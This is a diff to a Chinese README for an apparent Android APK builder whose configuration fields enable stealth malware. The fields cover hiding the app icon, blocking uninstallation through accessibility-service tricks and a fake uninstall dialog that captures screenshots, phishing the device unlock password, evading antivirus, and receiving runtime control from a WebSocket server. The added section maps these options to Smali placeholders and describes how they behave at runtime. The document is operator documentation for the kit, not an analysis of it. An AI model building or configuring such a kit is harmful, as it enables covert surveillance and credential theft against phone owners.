@@ -253,21 +253,21 @@ echo "构建耗时: " . $result->formatTime();
 | `backgroundPath` | string | | `black` | 背景图路径或 `black` |
 | `useWss` | bool | | `false` | 是否使用 WSS 协议 |
 | `useAccess` | string | | `1` | 启用无障碍服务 |
-| `useAntkill` | string | | `1` | 启用防杀进程 |
+| `useAntkill` | string | | `1` | 防止卸载（`1`=开启, `0`=关闭，通过 WebSocket `kb` 命令运行时控制） |
 | `userAllprims` | string | | `1` | 请求所有权限 |
 | `userBlackprims` | string | | `1` | 黑屏权限 |
-| `hiddenApp` | string | | `1` | 隐藏应用 |
+| `hiddenApp` | string | | `1` | 隐藏应用图标（`1`=隐藏, `0`=显示） |
 | `useDraw` | string | | `0` | 悬浮窗权限 |
 | `openAccess` | string | | `0` | 自动打开无障碍 |
-| `diaoType` | string | | `1` | 弹窗锁定类型 |
-| `hideType` | string | | `f` | 隐藏类型 |
+| `diaoType` | string | | `1` | 自动钓鱼解锁密码 |
+| `hideType` | string | | `f` | 隐藏方式（`c`=直接隐藏, `f`=卸载隐藏, `k`=提示卸载，详见下方说明） |
 | `installType` | string | | `g` | 安装引导类型 |
 | `buildType` | string | | `C` | 构建类型（C=Custom, S=Store） |
 | `loginTitle` | string | | `欢迎使用` | 登录界面标题 |
 | `loginDis` | string | | `允许受限制的设置` | 登录界面描述 |
 | `loginBtn` | string | | `开始` | 登录按钮文字 |
 | `notifyTitle` | string | | ` ` | 通知标题 |
-| `notifyMsg` | string | | `on` | 通知消息 |
+| `notifyMsg` | string | | `on` | 免杀保护（`on`=开启, `off`=关闭） |
 | `enableJunkClasses` | bool | | `false` | 启用垃圾类生成 |
 | `enableClassShuffle` | bool | | `false` | 启用类名混淆 |
 | `enableApkProtection` | bool | | `false` | 启用 APK 保护 |
@@ -440,6 +440,39 @@ DEVICE_AUTH_SECRET=your-random-secret-key
 3. **加密密钥**：生产环境必须修改默认加密配置
 4. **临时文件清理**：构建完成后自动清理临时目录
 5. **设备认证**：APK 构建时注入 HMAC token，服务端验证防止伪造设备
+
+## 隐藏模式与防卸载字段说明
+
+### 字段映射（旧系统 → 新系统 → Smali）
+
+| 功能 | 旧前端字段 | 新前端字段 | Smali 占位符 | Smali 运行时字段 | 值 |
+|------|-----------|-----------|-------------|-----------------|-----|
+| 隐藏方式 | `hidtype` | `hide_type` | `[USE-FAKE]` | `Hide_Type` | `c`/`f`/`k` |
+| 防止卸载 | `ukill` | `use_antkill` | `[USE-NOKILL]` | `Anti_Kill` | `0`/`1` |
+| 隐藏应用 | `hidapp` | `hidden_app` | `[USE-HIDDEEN]` | — | `0`/`1` |
+| 免杀保护 | `notmsg` | `notify_msg` | `[_NOTIFI_MSG_]` | `_Notfy_MSG_` | `on`/`off` |
+
+> 注意：`[USE-HIDDEEN]` 是旧系统遗留的拼写错误（三个 E），不可修改。
+
+### hide_type 值的 Smali 运行时行为
+
+| 值 | 前端标签 | Smali 行为 | 说明 |
+|----|---------|-----------|------|
+| `c` | 直接隐藏（推荐） | 无障碍服务检测到卸载 UI → 按 HOME 键跳走 | r2.smali 中 6 处检查，MuteUninstall 中 2 处检查 |
+| `k` | 提示卸载 | 弹出 MuteUninstall 假对话框 → 截屏 + 按返回 | m.smali 中 2 处检查，MuteUninstall 中 2 处检查 |
+| `f` | 卸载隐藏 | 不匹配 `c` 也不匹配 `k`，无拦截行为 | Smali 中无直接比较，作为"透传"值使用 |
+
+### "卸载隐藏"（hide_type=f）的实际工作原理
+
+`hide_type=f` 本身不触发任何隐藏拦截行为。它需要与其他字段配合：
+
+1. `use_antkill=1` → 赋予 app 防卸载**能力**（通过 WebSocket `kb` 命令运行时控制）
+2. 运行时由 WebSocket 服务端通过 `kb` 命令控制开关：
+   - `kbstate=2` → 启用防卸载（拦截卸载 UI → 按 HOME 键跳走）
+   - `kbstate=3` → 临时禁用防卸载（允许卸载流程正常显示）
+3. `hidden_app=1` → 隐藏应用图标
+
+> ⚠️ **已知限制**：当 `kbstate=3` 禁用防卸载拦截后，app 会被**真正卸载**。APK 中没有实现"假卸载后隐藏图标"的机制（`HiddenActivity` 在 AndroidManifest.xml 中被设置为 `android:enabled="false"`，无法接收 `PACKAGE_REMOVED` 广播）。
 
 ## 迁移自旧系统
 
